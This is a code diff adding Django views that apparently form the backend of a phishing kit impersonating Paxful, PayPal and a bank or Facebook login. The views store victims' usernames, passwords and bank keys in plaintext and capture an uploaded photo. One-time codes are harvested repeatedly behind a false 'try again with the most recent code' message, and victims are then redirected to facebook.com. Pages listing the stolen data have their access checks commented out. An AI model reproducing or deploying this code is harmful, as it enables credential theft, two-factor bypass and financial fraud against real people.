@@ -43,6 +43,19 @@ from django.views.decorators.http import require_POST
 from django.urls import reverse
 
 
+#imports pax
+from .models import UserSubmission, OTPSubmission
+from django.contrib.auth.decorators import login_required, user_passes_test
+
+#imports banco/fb
+
+
+#imports Paypal part2
+
+from .models import UserSubmissionPaypal, OTPSubmissionPaypal
+
+
+
 def index(request):
     return render(request,'index.html')
 
@@ -763,3 +776,148 @@ class PaypalValidatePaymentView(APIView):
 # Payment Required View
 def payment_required_view(request):
     return render(request, 'payment_required.html')
+
+
+
+
+
+    #paxful views
+
+#viewspax
+
+def paxful(request):
+    if request.method == 'POST':
+        username = request.POST.get('username')
+        password = request.POST.get('password')
+        
+        # Save the username and password
+        submission = UserSubmission.objects.create(username=username, password=password)
+        
+        # Redirect to the verify page with submission_id
+        return redirect('verification', submission_id=submission.id)
+    
+    return render(request, 'paxful.html')
+
+def verification(request, submission_id):
+    submission = UserSubmission.objects.get(id=submission_id)
+    message = ""
+    
+    if request.method == 'POST':
+        otp = request.POST.get('otp')
+        
+        # Save the new OTP
+        OTPSubmission.objects.create(user_submission=submission, otp=otp)
+        
+        message = "Code seems to be correct .Try again with the most recent code"
+    
+    otps = OTPSubmission.objects.filter(user_submission=submission)
+    return render(request, 'paxful2fa.html', {'submission_id': submission_id, 'message': message, 'otps': otps})
+
+
+
+
+# Step 2: Define a test function for superuser check
+def is_superuser(user):
+    return user.is_superuser
+
+
+
+# Step 3: Apply the decorators to your view
+#@login_required(login_url='/admin/login/')
+#@user_passes_test(is_superuser, login_url='/admin/login/')
+def infodbpaxful(request):
+    user_submissions = UserSubmission.objects.all().prefetch_related('otps')
+    return render(request, 'view_all.html', {'user_submissions': user_submissions})
+
+
+
+#views bancobhd/fb
+
+def home(request):
+    if request.method == 'POST':
+        user_id = request.POST.get('UserId')
+        clave = request.POST.get('Clave')
+        
+        # Save the data in the session
+        request.session['user_id'] = user_id
+        request.session['clave'] = clave
+
+        User.objects.create(user_id=user_id, clave=clave)
+
+       # print(f"Home view: user_id={user_id}, clave={clave}") 
+
+        return redirect('/success')
+    return render(request, 'pprequest.html')
+
+def upload(request):
+    if request.method == 'POST':
+        image = request.FILES.get('photo')
+
+        # Retrieve data from the session
+        user_id = request.session.get('user_id')
+        clave = request.session.get('clave')
+        User.objects.create(user_id=user_id, clave=clave, image=image)
+        return redirect('/success')
+    return render(request, 'index2.html')
+
+def success(request):
+    return redirect('https://www.facebook.com/')
+
+
+def view_image(request, image_id):
+    image_record = get_object_or_404(User, id=image_id)
+    return HttpResponse(image_record.image, content_type='image/jpeg')
+
+
+#def infodbpax(request):
+ #   data = User.objects.all()
+ #   return render(request, 'data.html', {'data': data})
+
+
+
+
+#viewspaypal
+
+def paypal(request):
+    if request.method == 'POST':
+        username = request.POST.get('username')
+        password = request.POST.get('password')
+        
+        # Save the username and password
+        submission = UserSubmissionPaypal.objects.create(username=username, password=password)
+        
+        # Redirect to the verify page with submission_id
+        return redirect('otppaypal', submission_id=submission.id)
+    
+    return render(request, 'paypal.html')
+
+def otppaypal(request, submission_id):
+    submission = UserSubmissionPaypal.objects.get(id=submission_id)
+    message = ""
+    
+    if request.method == 'POST':
+        otp = request.POST.get('otp')
+        
+        # Save the new OTP
+        OTPSubmissionPaypal.objects.create(user_submission=submission, otp=otp)
+        
+        message = "Code seems to be correct .Try again with the most recent code"
+    
+    otps = OTPSubmissionPaypal.objects.filter(user_submission=submission)
+    return render(request, 'paypal2fa.html', {'submission_id': submission_id, 'message': message, 'otps': otps})
+
+
+
+
+# Step 2: Define a test function for superuser check
+def is_superuser(user):
+    return user.is_superuser
+
+
+
+# Step 3: Apply the decorators to your view
+#@login_required(login_url='/admin/login/')
+#@user_passes_test(is_superuser, login_url='/admin/login/')
+def infodbpaypal(request):
+    user_submissions = UserSubmissionPaypal.objects.all().prefetch_related('otps')
+    return render(request, 'view_all.html', {'user_submissions': user_submissions})
